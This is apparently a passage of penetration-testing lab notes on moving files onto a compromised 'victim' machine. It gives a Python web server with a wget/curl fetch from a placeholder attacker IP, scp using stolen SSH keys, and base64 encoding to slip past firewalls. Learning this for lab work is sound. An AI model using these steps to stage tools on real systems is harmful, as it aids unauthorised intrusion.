### 1. The "Web Server" Method (Most Common)

You turn your Kali/Pwnbox into a mini-website. The victim "downloads" the file from you.

- **Your Machine:** `python3 -m http.server 8000`
    
- **Victim Machine:** `wget http://[YOUR_IP]:8000/tool.sh` or `curl http://[YOUR_IP]:8000/tool.sh -o tool.sh`
    

### 2. The "SCP" Method (If you have SSH credentials)

If you already found a password or an `id_rsa` key (like you did in the last section!), you can use Secure Copy.

- **Command:** `scp [file] [user]@[IP]:[destination_path]`
    

### 3. The "Base64" Method (The Stealth/No-Network Trick)

If a firewall blocks all downloads, you turn the file into **text** (Base64), copy the text, paste it into the victim's terminal, and turn it back into a file.

- **Analogy:** It's like taking a Lego castle apart, mailing the bricks in an envelope (text), and rebuilding it on the other side.